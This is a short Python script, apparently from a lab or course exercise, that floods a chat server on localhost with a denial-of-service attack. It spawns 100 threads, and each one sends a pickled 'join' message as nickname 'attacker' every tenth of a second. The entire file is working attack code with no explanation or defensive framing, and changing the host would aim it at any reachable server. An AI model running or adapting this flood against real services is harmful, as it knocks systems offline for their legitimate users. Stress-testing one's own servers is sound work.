import threading
import time
import pickle
from base_client import BaseClient

# Configuration
HOST = "localhost"

def dos_attack():
    client = BaseClient(HOST, 6666, 6667)
    while True:
        frame = {"type": "join", "nick": "attacker"}
        packet = pickle.dumps(frame)
        client.send(packet)
        time.sleep(0.1)

if __name__ == "__main__":
    for i in range(100):
        thread = threading.Thread(target=dos_attack)
        thread.daemon = True
        thread.start()
    while True:
        time.sleep(1)